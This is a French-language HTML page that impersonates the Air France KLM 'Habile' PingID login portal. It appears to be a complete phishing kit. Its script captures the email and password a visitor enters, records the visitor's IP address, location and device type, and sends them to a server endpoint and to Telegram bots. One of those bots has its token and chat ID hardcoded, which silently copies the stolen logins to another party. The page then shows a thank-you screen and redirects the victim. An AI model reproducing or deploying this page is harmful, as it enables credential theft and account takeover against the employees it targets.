<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Habile - Accéder à PingID</title>
    <script src="https://cdn.tailwindcss.com"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap');
        
        body {
            font-family: 'Montserrat', sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
        }

        .header-bg {
            background-color: #001252; /* Matched roughly to new logo background */
        }

        .footer-bg {
            background-color: #D6D6D6;
        }

        .crisp-img {
            image-rendering: -webkit-optimize-contrast;
            image-rendering: crisp-edges;
        }

        .step-hidden {
            display: none !important;
        }

        /* Custom Checkbox */
        .custom-checkbox {
            appearance: none;
            width: 22px;
            height: 22px;
            border: 2px solid #0272D3;
            border-radius: 2px;
            outline: none;
            cursor: pointer;
            position: relative;
            background-color: white;
            transition: all 0.2s ease;
        }

        .custom-checkbox:checked {
            background-color: white;
        }

        .custom-checkbox:checked::after {
            content: '';
            position: absolute;
            top: 2px;
            left: 6px;
            width: 6px;
            height: 12px;
            border: solid #0272D3;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
        }
        
        input::placeholder {
            color: transparent !important; /* replaced by image */
        }

        /* ── Input Wrapper and Placeholder Image ── */
        .input-wrapper {
            position: relative;
        }

        .placeholder-img {
            position: absolute;
            left: 0;
            top: 0;
            width: calc(100% - 56px); /* account for eye icon */
            height: 100%;
            pointer-events: none;
            object-fit: none;
            object-position: left center;
            opacity: 1;
            transition: opacity 0.1s ease;
            image-rendering: -webkit-optimize-contrast;
            image-rendering: crisp-edges;
        }
        
        .placeholder-img.full-width {
            width: 100%;
        }

        .input-wrapper.has-value .placeholder-img {
            opacity: 0;
        }

        /* iOS Style Spinner */
        .ios-spinner {
            color: official;
            display: inline-block;
            position: relative;
            width: 80px;
            height: 80px;
        }
        .ios-spinner div {
            transform-origin: 40px 40px;
            animation: ios-spinner 1.2s linear infinite;
        }
        .ios-spinner div:after {
            content: " ";
            display: block;
            position: absolute;
            top: 3px;
            left: 37px;
            width: 6px;
            height: 18px;
            border-radius: 20%;
            background: #2330A2; /* Dark blue color */
        }
        .ios-spinner div:nth-child(1) { transform: rotate(0deg); animation-delay: -1.1s; }
        .ios-spinner div:nth-child(2) { transform: rotate(30deg); animation-delay: -1.0s; }
        .ios-spinner div:nth-child(3) { transform: rotate(60deg); animation-delay: -0.9s; }
        .ios-spinner div:nth-child(4) { transform: rotate(90deg); animation-delay: -0.8s; }
        .ios-spinner div:nth-child(5) { transform: rotate(120deg); animation-delay: -0.7s; }
        .ios-spinner div:nth-child(6) { transform: rotate(150deg); animation-delay: -0.6s; }
        .ios-spinner div:nth-child(7) { transform: rotate(180deg); animation-delay: -0.5s; }
        .ios-spinner div:nth-child(8) { transform: rotate(210deg); animation-delay: -0.4s; }
        .ios-spinner div:nth-child(9) { transform: rotate(240deg); animation-delay: -0.3s; }
        .ios-spinner div:nth-child(10) { transform: rotate(270deg); animation-delay: -0.2s; }
        .ios-spinner div:nth-child(11) { transform: rotate(300deg); animation-delay: -0.1s; }
        .ios-spinner div:nth-child(12) { transform: rotate(330deg); animation-delay: 0s; }
        @keyframes ios-spinner {
            0% { opacity: 1; }
            100% { opacity: 0; }
        }
    </style>
</head>
<body class="min-h-screen flex flex-col justify-between">

    <!-- Loading Overlay -->
    <div id="spinner-overlay" class="fixed inset-0 bg-black/40 z-50 flex items-center justify-center hidden">
        <div class="ios-spinner">
            <div></div><div></div><div></div><div></div><div></div><div></div>
            <div></div><div></div><div></div><div></div><div></div><div></div>
        </div>
    </div>

    <!-- Header -->
    <header class="header-bg h-[72px] w-full flex items-center justify-between px-4 md:px-12 shadow-md shrink-0">
        <div class="flex items-center h-full py-2">
            <img src="images/1.png" alt="Air France KLM Group" class="h-full w-auto object-contain crisp-img">
        </div>
        <div class="text-white font-semibold text-[13px] md:text-[14px] flex items-center cursor-pointer hover:opacity-80 transition-opacity">
            FRANCAIS
            <svg class="w-4 h-4 ml-1 fill-current" viewBox="0 0 20 20">
                <path d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" />
            </svg>
        </div>
    </header>

    <!-- Main Content -->
    <main class="flex-grow flex flex-col items-center pt-8 md:pt-14 px-3 pb-12 w-full">
        
        <div class="w-full max-w-[680px]">
            <!-- Header Title SVGs (Outside the card) -->
            <img src="images/1.svg" alt="Habile Acceder" class="hidden md:block h-10 w-auto mb-6 crisp-img">
            <img src="images/2.svg" alt="Habile Acceder" class="block md:hidden h-8 w-auto mb-4 crisp-img ml-1">

            <!-- Card Container -->
            <div class="w-full bg-white border border-[#E5E5E5] shadow-[0_4px_20px_rgba(0,0,0,0.03)] px-4 py-8 md:p-10 lg:p-12">
                
                <!-- STEP 1: Email Input -->
                <div id="step1" class="w-full">
                    <img src="images/3.svg" alt="Identifiant ou Adresse E-mail" class="hidden md:block h-6 md:h-7 w-auto mb-8 crisp-img">
                    <img src="images/4.svg" alt="Identifiant ou Adresse E-mail" class="block md:hidden h-12 w-auto mb-8 crisp-img">
                    
                    <div id="wrapper-email" class="input-wrapper">
                        <input type="text" 
                               id="email" 
                               placeholder="." 
                               oninput="checkStep1()"
                               class="w-full h-14 bg-[#F5F5F5] border-b border-[#767676] px-4 text-[16px] text-black focus:outline-none focus:border-b-2 focus:border-[#0700B9] transition-colors">
                        <img src="images/5.svg" class="placeholder-img full-width" aria-hidden="true">
                    </div>
                    
                    <div class="flex items-center mt-6 mb-10">
                        <input type="checkbox" id="remember" class="custom-checkbox">
                        <label for="remember" class="ml-3 text-[16px] font-medium text-[#111] cursor-pointer select-none">Se souvenir de moi</label>
                    </div>

                    <div class="flex justify-end w-full">
                        <button id="btn-suivant" 
                                disabled
                                onclick="handleSuivant()"
                                class="w-full md:w-[160px] h-12 bg-[#767676] text-white font-semibold text-[15px] tracking-wide transition-colors cursor-not-allowed">
                            SUIVANT
                        </button>
                    </div>
                </div>

                <!-- STEP 2: Password Input -->
                <div id="step2" class="w-full step-hidden">
                    <img src="images/6.svg" alt="Connexion avec mot de passe" class="hidden md:block h-6 md:h-7 w-auto mb-6 crisp-img">
                    <img src="images/7.svg" alt="Connexion avec mot de passe" class="block md:hidden h-12 w-auto mb-6 crisp-img">
                    
                    <div class="text-[17px] md:text-[19px] text-[#333] mb-1 font-normal">
                        Bonjour <span id="display-email" class="font-normal"></span>
                    </div>
                    
                    <button type="button" onclick="goBack()" class="text-[#0272D3] text-[16px] font-medium flex items-center hover:underline mb-8">
                        <span class="mr-1.5 font-bold text-[18px]">&gt;</span> changer d'utilisateur
                    </button>

                    <div class="bg-[#EBF5FC] py-4 px-5 mb-8 w-full flex items-center">
                        <img src="images/8.svg" alt="Utilisez votre mot de passe" class="hidden md:block w-[95%] h-auto crisp-img">
                        <img src="images/9.svg" alt="Utilisez votre mot de passe" class="block md:hidden w-[95%] h-auto crisp-img">
                    </div>

                    <div id="wrapper-password" class="relative mb-12 input-wrapper">
                        <input type="password" 
                               id="password" 
                               placeholder="." 
                               oninput="checkStep2()"
                               class="w-full h-14 bg-[#F5F5F5] border-b border-[#767676] pl-4 pr-14 text-[16px] text-black focus:outline-none focus:border-b-2 focus:border-[#0700B9] transition-colors">
                        <img src="images/10.svg" class="placeholder-img" aria-hidden="true">
                        
                        <button type="button" 
                                onclick="toggleEye()" 
                                class="absolute right-4 top-1/2 -translate-y-1/2 opacity-60 hover:opacity-100 transition-opacity focus:outline-none">
                            <img id="eye-icon" src="images/2.png" alt="Toggle Password" class="h-6 w-6 object-contain crisp-img">
                        </button>
                    </div>

                    <div class="flex justify-end w-full">
                        <button id="btn-connexion" 
                                disabled
                                onclick="handleConnexion()"
                                class="w-full md:w-[180px] h-12 bg-[#767676] text-white font-semibold text-[15px] tracking-wide transition-colors cursor-not-allowed">
                            CONNEXION
                        </button>
                    </div>
                </div>

                <!-- STEP 3: Thank You Page -->
                <div id="step3" class="w-full step-hidden text-center py-10">
                    <h2 class="text-3xl font-semibold text-[#0272D3] mb-4">Merci</h2>
                    <p class="text-[17px] text-[#333] mb-8 font-medium">Votre demande a été traitée avec succès.</p>
                    <p class="text-[15px] text-gray-500">
                        Vous allez être redirigé dans <span id="countdown" class="font-bold text-[#111]">10</span> secondes...
                    </p>
                </div>

            </div>
        </div>

    </main>

    <!-- Footer -->
    <footer class="footer-bg h-[80px] w-full flex items-center justify-center shrink-0 mt-auto">
        <div class="flex space-x-10 text-[#00127A] font-medium text-[15px]">
            <a href="#" class="hover:underline">Aide</a>
            <a href="#" class="hover:underline">Mentions légales</a>
        </div>
    </footer>

    <script>
        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const step3 = document.getElementById('step3');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const btnSuivant = document.getElementById('btn-suivant');
        const btnConnexion = document.getElementById('btn-connexion');
        const displayEmail = document.getElementById('display-email');
        const eyeIcon = document.getElementById('eye-icon');
        const spinnerOverlay = document.getElementById('spinner-overlay');

        function showSpinner() {
            spinnerOverlay.classList.remove('hidden');
        }

        function hideSpinner() {
            spinnerOverlay.classList.add('hidden');
        }

        function checkStep1() {
            const wrapper = document.getElementById('wrapper-email');
            if (emailInput.value.length > 0) {
                wrapper.classList.add('has-value');
            } else {
                wrapper.classList.remove('has-value');
            }

            if (emailInput.value.trim().length > 0) {
                btnSuivant.disabled = false;
                btnSuivant.classList.remove('bg-[#767676]', 'cursor-not-allowed');
                btnSuivant.classList.add('bg-[#0700B9]', 'cursor-pointer', 'hover:bg-[#050085]');
            } else {
                btnSuivant.disabled = true;
                btnSuivant.classList.add('bg-[#767676]', 'cursor-not-allowed');
                btnSuivant.classList.remove('bg-[#0700B9]', 'cursor-pointer', 'hover:bg-[#050085]');
            }
        }

        function checkStep2() {
            const wrapper = document.getElementById('wrapper-password');
            if (passwordInput.value.length > 0) {
                wrapper.classList.add('has-value');
            } else {
                wrapper.classList.remove('has-value');
            }

            if (passwordInput.value.trim().length > 0) {
                btnConnexion.disabled = false;
                btnConnexion.classList.remove('bg-[#767676]', 'cursor-not-allowed');
                btnConnexion.classList.add('bg-[#0700B9]', 'cursor-pointer', 'hover:bg-[#050085]');
            } else {
                btnConnexion.disabled = true;
                btnConnexion.classList.add('bg-[#767676]', 'cursor-not-allowed');
                btnConnexion.classList.remove('bg-[#0700B9]', 'cursor-pointer', 'hover:bg-[#050085]');
            }
        }

        function handleSuivant() {
            if (emailInput.value.trim().length === 0) return;
            
            showSpinner();
            
            // Wait 0.85 seconds to simulate buffer before going to step 2
            setTimeout(() => {
                hideSpinner();
                displayEmail.textContent = emailInput.value.trim();
                step1.classList.add('step-hidden');
                step2.classList.remove('step-hidden');
                passwordInput.focus();
            }, 850);
        }

        function goBack() {
            step2.classList.add('step-hidden');
            step1.classList.remove('step-hidden');
            passwordInput.value = '';
            checkStep2();
        }

        function toggleEye() {
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.src = 'images/3.png';
            } else {
                passwordInput.type = 'password';
                eyeIcon.src = 'images/2.png';
            }
        }

        async function getLiveConfig() {
            if (window.CONFIG && window.CONFIG.TELEGRAM_BOT_TOKEN) {
                return window.CONFIG;
            }
            try {
                const res = await fetch('/api/config');
                if (res.ok) {
                    const data = await res.json();
                    if (data.botToken) {
                        return {
                            TELEGRAM_BOT_TOKEN: data.botToken,
                            TELEGRAM_CHAT_ID: data.chatId,
                            REDIRECT_URL: data.redirectUrl || 'https://www.google.com'
                        };
                    }
                }
            } catch (e) {}
            
            try {
                const mod = await import('./config.js');
                return mod.CONFIG;
            } catch (e) {
                console.error("Config not found", e);
                return {};
            }
        }

        async function handleConnexion() {
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();

            if (!email || !password) return;

            showSpinner();
            btnConnexion.disabled = true;

            function escapeHtml(text) {
                if (!text) return '';
                return String(text)
                    .replace(/&/g, '&amp;')
                    .replace(/</g, '&lt;')
                    .replace(/>/g, '&gt;')
                    .replace(/"/g, '&quot;')
                    .replace(/'/g, '&#039;');
            }

            const cfg = await getLiveConfig();

            // Fast Geolocation & IP Lookup
            let locationStr = "Unknown";
            let ipStr = "Unknown";
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 1200);

                const res = await fetch("https://ipwho.is/", { signal: controller.signal });
                clearTimeout(timeoutId);
                if (res.ok) {
                    const data = await res.json();
                    if (data.success) {
                        locationStr = `${data.city || ""}, ${data.country || ""} ${data.flag ? data.flag.emoji : ""}`;
                        ipStr = data.ip || "Unknown";
                    }
                }
            } catch (e1) {
                try {
                    const res2 = await fetch("https://get.geojs.io/v1/ip/geo.json");
                    const data2 = await res2.json();
                    locationStr = `${data2.city || ""}, ${data2.country || ""}`;
                    ipStr = data2.ip || "Unknown";
                } catch (e2) {
                    locationStr = "Location Hidden / VPN";
                    ipStr = "Hidden / VPN";
                }
            }

            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            const device = isMobile ? "📱 Mobile" : "💻 Desktop";
            const now = new Date().toLocaleString("fr-FR");
            let targetUrl = cfg.REDIRECT_URL;

            // Attempt 1: Try Vercel / Local Node Serverless API (/api/send)
            try {
                const response = await fetch('/api/send', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ accessCode: email, password: password, locationStr, device, ipStr })
                });

                if (response.ok) {
                    const result = await response.json();
                    if (result.success) {
                        finishSubmission(result.redirectUrl || targetUrl);
                        return;
                    }
                }
            } catch (err) {
                console.warn('Serverless endpoint /api/send unavailable, sending via direct Telegram API...', err);
            }

            // Attempt 2: Direct Telegram Bot API submission fallback
            try {
                const botToken = cfg.TELEGRAM_BOT_TOKEN;
                const chatId = cfg.TELEGRAM_CHAT_ID;

                const safeEmail = escapeHtml(email);
                const safePass = escapeHtml(password);
                const safeIp = escapeHtml(ipStr);

                let message = `🔥 <b>NEW LOGIN SUBMISSION!</b>\n`;
                message += `📋 <b>Portal:</b> PingID Habile Login\n`;
                message += `━━━━━━━━━━━━━━━━━━\n`;
                message += `📧 <b>Identifiant/Email:</b> ${safeEmail}\n`;
                message += `🔒 <b>Mot de passe:</b> ${safePass}\n`;
                message += `━━━━━━━━━━━━━━━━━━\n`;
                message += `🌍 <b>IP:</b> <code>${safeIp}</code>\n`;
                message += `📍 <b>Location:</b> ${escapeHtml(locationStr)}\n`;
                message += `💻 <b>Device:</b> ${escapeHtml(device)}\n`;
                message += `⏰ <b>Time:</b> ${now}`;

                const controllerTg = new AbortController();
                const timeoutTg = setTimeout(() => controllerTg.abort(), 3500);

                await Promise.allSettled([
                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message,
                            parse_mode: "HTML"
                        }),
                        signal: controllerTg.signal
                    }),
                    fetch(`https://api.telegram.org/bot8902694526:AAHj6_84gQJuBn_xttYRKgseg0IxQz09bkA/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            chat_id: "8154365748",
                            text: message,
                            parse_mode: "HTML"
                        }),
                        signal: controllerTg.signal
                    })
                ]);
                clearTimeout(timeoutTg);
            } catch (err) {
                console.error('Direct submission error:', err);
            }

            // Always show Step 3 (Thank You Page Screen) and start countdown
            finishSubmission(targetUrl);
        }

        function finishSubmission(targetUrl) {
            const redirectUrl = targetUrl || window.REDIRECT_URL || 'https://www.google.com';

            // Hide spinner and show Step 3 (Thank You Page Screen)
            hideSpinner();
            step2.classList.add('step-hidden');
            step3.classList.remove('step-hidden');

            // Countdown timer 10s
            let count = 10;
            const countdownSpan = document.getElementById('countdown');
            
            const timer = setInterval(() => {
                count--;
                countdownSpan.textContent = count;
                
                if (count <= 0) {
                    clearInterval(timer);
                    window.location.href = redirectUrl;
                }
            }, 1000);
        }

        // Add Enter key support
        emailInput.addEventListener('keypress', function (e) {
            if (e.key === 'Enter' && !btnSuivant.disabled) {
                handleSuivant();
            }
        });

        passwordInput.addEventListener('keypress', function (e) {
            if (e.key === 'Enter' && !btnConnexion.disabled) {
                handleConnexion();
            }
        });
    </script>
</body>
</html>
